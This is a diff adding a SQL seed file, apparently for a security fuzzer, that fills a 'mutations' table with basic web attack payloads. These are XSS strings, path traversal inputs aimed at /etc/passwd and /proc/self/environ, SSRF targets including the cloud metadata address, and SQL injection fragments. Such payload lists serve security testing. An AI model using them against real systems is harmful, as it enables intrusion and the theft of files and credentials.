@@ -1,0 +1,14 @@
+DROP TABLE IF EXISTS mutations;
+CREATE TABLE mutations (id INTEGER PRIMARY KEY AUTOINCREMENT, technique TEXT, mutated_payload TEXT);
+INSERT INTO mutations (technique, mutated_payload) VALUES ('basic-xss', '<script>alert(1)</script>');
+INSERT INTO mutations (technique, mutated_payload) VALUES ('basic-xss', '<img src=x onerror=alert(1)>');
+INSERT INTO mutations (technique, mutated_payload) VALUES ('basic-xss', '<svg onload=alert(1)>');
+INSERT INTO mutations (technique, mutated_payload) VALUES ('basic-lfi', '../../etc/passwd');
+INSERT INTO mutations (technique, mutated_payload) VALUES ('basic-lfi', '../../../../../../../../etc/hosts');
+INSERT INTO mutations (technique, mutated_payload) VALUES ('basic-lfi', '/proc/self/environ');
+INSERT INTO mutations (technique, mutated_payload) VALUES ('basic-ssrf', 'http://localhost/admin');
+INSERT INTO mutations (technique, mutated_payload) VALUES ('basic-ssrf', 'http://169.254.169.254');
+INSERT INTO mutations (technique, mutated_payload) VALUES ('basic-ssrf', 'http://127.0.0.1');
+INSERT INTO mutations (technique, mutated_payload) VALUES ('sql-obf', ''' UNION SELECT NULL--');
+INSERT INTO mutations (technique, mutated_payload) VALUES ('sql-obf', ''' AND 1=1 --');
+INSERT INTO mutations (technique, mutated_payload) VALUES ('sql-obf', 'admin'' --');
